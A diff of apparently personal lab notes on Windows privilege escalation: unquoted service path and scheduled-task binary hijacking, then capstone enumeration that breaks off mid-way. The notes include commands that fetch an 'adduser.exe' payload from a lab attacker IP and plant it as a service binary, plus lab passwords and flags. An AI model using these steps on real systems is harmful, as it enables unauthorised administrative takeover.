@@ -627,3 +627,294 @@ PS C:\Windows\system32> whoami /groups
 
 
 # Unquoted Service Paths
+
+2. Connect to _CLIENTWK221_ (VM #2) via RDP as user _damian_ with the password _ICannotThinkOfAPassword1!_. Enumerate the services and find an unquoted service binary path containing spaces. Exploit it with methods from this section and obtain an interactive shell as the user running the service. Find the flag on the desktop.
+
+- Enumerate
+```powershell
+PS C:\Users\damian> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike 'C:\Windows\system32\*'}
+	Name                          State   PathName
+	----                          -----   --------
+	BackupMonitor                 Running C:\BackupMonitor\BackupMonitor.exe
+	edgeupdate                    Stopped "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+	edgeupdatem                   Stopped "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
+	LSM                           Running
+	MicrosoftEdgeElevationService Stopped "C:\Program Files (x86)\Microsoft\Edge\Application\107.0.1418.62\elevation_ser...
+	NetSetupSvc                   Stopped
+	NetTcpPortSharing             Stopped C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe
+	PerfHost                      Stopped C:\Windows\SysWow64\perfhost.exe
+	ReynhSurveillance             Stopped C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance...
+	Sense                         Stopped "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
+	TrustedInstaller              Stopped C:\Windows\servicing\TrustedInstaller.exe
+	uhssvc                        Stopped "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
+	VGAuthService                 Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+	VMTools                       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+	wbengine                      Stopped "C:\Windows\system32\wbengine.exe"
+	WdNisSvc                      Stopped "C:\Program Files\Windows Defender\NisSrv.exe"
+	WinDefend                     Stopped "C:\Program Files\Windows Defender\MsMpEng.exe"
+	WMPNetworkSvc                 Stopped "C:\Program Files\Windows Media Player\wmpnetwk.exe"
+```
+	- Only unquoted service `ReynhSurveillance`
+
+- Verify user can stop service, and what access rights user has
+```powershell
+PS C:\Users\damian> Stop-Service ReynhSurveillance
+
+PS C:\Users\damian> icacls "C:\Enterprise Software"
+	C:\Enterprise Software BUILTIN\Administrators:(OI)(CI)(F)
+		   NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+		   BUILTIN\Users:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Users\damian> icacls "C:\Enterprise Software\Monitoring Solution"
+	C:\Enterprise Software\Monitoring Solution CLIENTWK221\damian:(OI)(CI)(RX,W)
+		   BUILTIN\Administrators:(OI)(CI)(F)
+		   NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+		   BUILTIN\Users:(OI)(CI)(RX)
+
+PS C:\Users\damian> icacls "C:\Enterprise Software\Monitoring Solution\Surveillance Apps"
+	C:\Enterprise Software\Monitoring Solution\Surveillance Apps BUILTIN\Administrators:(OI)(CI)(F)
+		NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+		BUILTIN\Users:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+	- We can see that damian has Write access to `C:\Enterprise Software\Monitoring Solution` directory
+
+> Issues happened when trying to add **Monitoring.exe** to the `C:\Enterprise Software\.` directory
+> Decided to try adding **Surveillance.exe** to `C:\Enterprise Software\Monitoring Solution\.` directory
+
+- Download previously crafted **adduser.exe**, and add it to dir, start service, and verify
+```powershell
+PS C:\Users\damian> iwr -uri http://192.168.45.238/adduser.exe -Outfile Surveillance.exe
+
+PS C:\Users\damian> copy .\Surveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
+
+PS C:\Users\damian> Start-Service ReynhSurveillance
+	Start-Service : Service 'ReynhSurveillance (ReynhSurveillance)' cannot be started due to the following error: Cannot
+	start service ReynhSurveillance on computer '.'.
+	At line:1 char:1
+	+ Start-Service ReynhSurveillance
+	+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
+	   ServiceCommandException
+	    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
+
+PS C:\Users\damian> net user
+	User accounts for \\CLIENTWK221
+	-------------------------------------------------------------------------------
+	Administrator            damian                   dave2
+	DefaultAccount           Guest                    mac
+	milena                   moss                     offsec
+	richmond                 roy                      WDAGUtilityAccount
+	The command completed successfully.
+
+PS C:\Users\damian> net localgroup administrators
+	Alias name     administrators
+	Comment        Administrators have complete and unrestricted access to the computer/domain
+	Members
+	-------------------------------------------------------------------------------
+	Administrator
+	dave2
+	offsec
+	roy
+	The command completed successfully.
+```
+
+- Elevate privs & get flag
+```powershell
+# First PS terminal
+PS C:\Users\damian> runas /user:dave2 powershell.exe
+	Enter the password for dave2:
+	Attempting to start powershell.exe as user "CLIENTWK221\dave2" ...
+
+# Second PS terminal
+PS C:\Windows\system32> Start-Process powershell.exe -Verb runas
+
+# Third PS terminal
+PS C:\Windows\system32> type C:\Users\roy\Desktop\flag.txt
+	OS{e184a65b0cbb356318ab97a3e7588364}
+```
+
+
+# Scheduled Tasks
+
+2. Connect to _CLIENTWK221_ (VM #2) via RDP as the user _moss_ with the password _work6potence6PLASMA6flint7_.
+   Enumerate the scheduled tasks on the system and find a way to obtain an interactive shell as user running the scheduled task.
+   The flag can be found on the desktop.
+
+```powershell
+# Enumerate
+PS C:\Users\moss> Get-ScheduledTask | Select TaskName,Author | Where-Object {$_.Author -notlike "Microsoft*"}
+	TaskName                                   Author
+	--------                                   ------
+	Voice Activation                           CLIENTWK221\offsec
+	.NET Framework NGEN v4.0.30319
+	.NET Framework NGEN v4.0.30319 64
+	.NET Framework NGEN v4.0.30319 64 Critical
+	.NET Framework NGEN v4.0.30319 Critical
+	Backup                                     $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-600)
+	Pre-staged app cleanup
+	...
+
+# Get binary path and run times
+PS C:\Users\moss> Get-ScheduledTask -TaskName "Voice Activation" | Get-ScheduledTaskInfo
+	LastRunTime        : 4/26/2024 10:45:45 AM
+	LastTaskResult     : 1
+	NextRunTime        : 4/26/2024 10:46:46 AM
+	NumberOfMissedRuns : 0
+	TaskName           : Voice Activation
+	TaskPath           : \Microsoft\
+	PSComputerName     :
+
+# Get binary path
+PS C:\Users\moss> schtasks /query /tn "\Microsoft\Voice Activation" /fo LIST /v
+	Folder: \Microsoft
+	HostName:                             CLIENTWK221
+	TaskName:                             \Microsoft\Voice Activation
+	Next Run Time:                        4/26/2024 10:48:50 AM
+	Status:                               Ready
+	Logon Mode:                           Interactive/Background
+	Last Run Time:                        4/26/2024 10:47:51 AM
+	Last Result:                          1
+	Author:                               CLIENTWK221\offsec
+	Task To Run:                          C:\Users\moss\Searches\VoiceActivation.exe
+	Start In:                             N/A
+	Comment:                              N/A
+	Scheduled Task State:                 Enabled
+	Idle Time:                            Disabled
+	Power Management:                     Stop On Battery Mode
+	Run As User:                          roy
+
+# Check Run As User's groups
+PS C:\Users\moss> net user roy
+	User name                    roy
+	...
+	Local Group Memberships      *Administrators       *Users
+	Global Group memberships     *None
+
+# Replace binary and exploit
+PS C:\Users\moss> cd .\Searches\
+
+PS C:\Users\moss\Searches> move .\VoiceActivation.exe .\VoiceActivation.exe.bak
+
+PS C:\Users\moss\Searches> iwr -uri http://192.168.45.207/adduser.exe -OutFile .\VoiceActivation.exe
+
+PS C:\Users\moss\Searches> net user
+	User accounts for \\CLIENTWK221
+	-------------------------------------------------------------------------------
+	Administrator            damian                   dave2
+	...
+
+PS C:\Users\moss\Searches> RunAs /user:dave2 powershell.exe
+	Enter the password for dave2:
+	Attempting to start powershell.exe as user "CLIENTWK221\dave2" ...
+
+PS C:\Windows\System32> Start-Process powershell -Verb runas
+
+PS C:\Windows\System32> type C:\Users\roy\Desktop\flag.txt
+	OS{d489fe16a663bbebed8266a3274f6079}
+```
+
+
+# Capstone
+
+2. **Capstone Exercise**: Get access to _CLIENTWK222_ (VM #2) by connecting to the bind shell on port 4444.
+   Use the methods covered in this Module to elevate your privileges to an administrative user.
+   Enter the flag, which is located in **C:\Users\enterpriseadmin\Desktop\flag.txt**
+
+- Enumerate
+```powershell
+C:\Windows\system32>whoami
+	clientwk222\diana
+
+C:\Windows\system32>whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+	Privilege Name                Description                          State   
+	============================= ==================================== ========
+	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+	SeUndockPrivilege             Remove computer from docking station Disabled
+	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+	SeTimeZonePrivilege           Change the time zone                 Disabled
+
+C:\Windows\system32>net users
+	User accounts for \\CLIENTWK222
+	-------------------------------------------------------------------------------
+	Administrator            alex                     DefaultAccount           
+	diana                    enterpriseadmin          enterpriseuser           
+	Guest                    offsec                   WDAGUtilityAccount       
+	The command completed successfully.
+
+C:\Windows\system32>powershell.exe
+	Windows PowerShell
+	Copyright (C) Microsoft Corporation. All rights reserved.
+	
+	Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> Get-LocalGroup
+```	Get-LocalGroup : The term 'Get-LocalGroup' is not recognized as the name of a cmdlet, function, script file, or 
+	operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
+	again.
+	At line:1 char:1
+	+ Get-LocalGroup
+	+ ~~~~~~~~~~~~~~
+	    + CategoryInfo          : ObjectNotFound: (Get-LocalGroup:String) [], CommandNotFoundException
+	    + FullyQualifiedErrorId : CommandNotFoundException
+```
+	- Research on this error message shows that Microsoft.Powershell.LocalAccounts module isn't installed on the server.
+	- Attempting to install it with `Install-Module Microsoft.Powershell.LocalAccounts` triggered the same error.
+	- Will need to stick with net.exe
+
+```powershell
+C:\Windows\system32>net group
+	This command can be used only on a Windows Domain Controller.
+	More help is available by typing NET HELPMSG 3515.
+
+C:\Windows\system32>net helpmsg 3515
+	This command can be used only on a Windows Domain Controller.
+```
+	- Ok, so no go there
+
+```powershell
+# Using `net user` to find users' groups
+C:\Windows\system32>net user
+	User accounts for \\CLIENTWK222
+	-------------------------------------------------------------------------------
+	Administrator            alex                     DefaultAccount           
+	diana                    enterpriseadmin          enterpriseuser           
+	Guest                    offsec                   WDAGUtilityAccount       
+	The command completed successfully.
+
+
+C:\Windows\system32>net user diana
+	...
+	Local Group Memberships      *Performance Log Users*Users                
+	Global Group memberships     *None                 
+
+
+C:\Windows\system32>net user alex
+	...
+	Local Group Memberships      *Remote Desktop Users *Remote Management Use  *Users                
+	Global Group memberships     *None                 
+
+
+C:\Windows\system32>net user offsec
+	...
+	Local Group Memberships      *Administrators       *Users                
+	Global Group memberships     *None                 
+
+# Get History
+PS C:\Windows\system32> Get-History
+
+PS C:\Windows\system32> (Get-PSReadlineOption).HistorySavePath
+	(Get-PSReadlineOption).HistorySavePath
+	Get-PSReadlineOption : The term 'Get-PSReadlineOption' is not recognized as the name of a cmdlet, function, script...
+
+# Get system info
+PS C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"OS Type"
+	OS Name:                   Microsoft Windows 11 Pro
+	OS Version:                10.0.22000 N/A Build 22000
+
+# Get running processes
+```
